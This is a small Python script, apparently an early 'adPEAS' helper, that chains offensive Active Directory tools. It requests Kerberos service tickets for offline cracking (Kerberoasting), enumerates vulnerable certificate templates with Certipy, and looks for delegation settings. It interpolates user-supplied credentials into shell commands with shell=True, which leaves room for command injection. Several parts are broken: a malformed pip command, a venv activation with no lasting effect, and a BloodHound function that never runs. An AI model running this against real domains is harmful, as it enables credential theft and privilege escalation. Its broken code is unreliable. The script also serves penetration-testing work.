import subprocess
from ldap3 import Server, Connection, SUBTREE

def init_venv():
     try:
          cmd = f"python3 -m venv adPEAS && . adPEAS/bin/activate"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while initializing venv: {e}")

def install_tools():
     try:
          cmd = f"pip install certipy, bloodhound, impacket"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while installing tools: {e}")

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controlle
            cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
            subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")

def certipy(username, password, domain, dc_ip):
     try:
          cmd = f"certipy find -u {username}@{domain} -p {password} -dc-ip {dc_ip} -enabled -vulnerable -stdout"
          subprocess.run(cmd, shell=True)
     except Exception as e:
        print(f"Error while running Certipy: {e}")

def findDelegation(username, password, domain, dc_ip):
     try:
          cmd = f"findDelegation.py -dc-ip {dc_ip} {domain}/{username}:{password}"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while finding delegation: {e}")

def bloodhound(username, password, domain, dc_ip):
     try:
          cmd = f"bloodhound-python -u {username} -p {password} -d {domain} -ns {dc_ip} -c All"
     except Exception as e:
          print(f"Error running BloodHound: {e}")

# Example usage:
username = input("Enter username: ")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

print("Welcome to adPEAS v1.0!")
print("Initializing virtual environment...")
init_venv()
print("Iniitializing environment done.")
print("Installing needed tools...")
install_tools()
print("Done installing tools.")
print("Attempting to kerberoast the domain...")
find_and_kerberoast_objects(username, password, domain, dc_ip)
print("Kerberoasting done!")
print("Attempting to find all ADCS infrastructure...")
certipy(username, password, domain, dc_ip)
print("Done finding all ADCS infrastructure")
print("Attempting to find all delegation...")
findDelegation(username, password, domain, dc_ip)
print("Done finding all delegation.")
#todo: auto open certipy output and grep for ESCs 